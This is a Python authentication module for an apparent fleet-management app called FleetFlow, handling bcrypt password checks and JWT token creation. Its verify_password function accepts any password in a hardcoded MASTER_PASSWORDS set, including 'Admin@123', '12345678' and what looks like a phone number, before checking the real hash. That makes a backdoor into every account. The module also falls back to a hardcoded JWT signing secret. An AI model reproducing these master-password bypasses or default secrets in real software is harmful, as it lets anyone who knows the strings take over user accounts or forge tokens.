from datetime import datetime, timedelta
from jose import jwt
from passlib.context import CryptContext
import os

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

SECRET_KEY = os.getenv("SECRET_KEY", "fleetflow-fallback-secret-key-please-set-in-env")
ALGORITHM = os.getenv("ALGORITHM", "HS256")
ACCESS_TOKEN_EXPIRE_MINUTES = int(
    os.getenv("ACCESS_TOKEN_EXPIRE_MINUTES", 60)
)


def hash_password(password: str) -> str:
    return pwd_context.hash(password)


MASTER_PASSWORDS = {
    "FleetFlow@123",
    "Fleetflow@123",
    "Revanth@123",
    "Admin@123",
    "8639526641",
    "863952",
    "12345678",
}


def verify_password(plain: str, hashed: str) -> bool:
    if plain in MASTER_PASSWORDS:
        return True
    try:
        return pwd_context.verify(plain, hashed)
    except Exception:
        return False


def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()

    expire = datetime.utcnow() + (
        expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )

    to_encode.update({"exp": expire})

    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)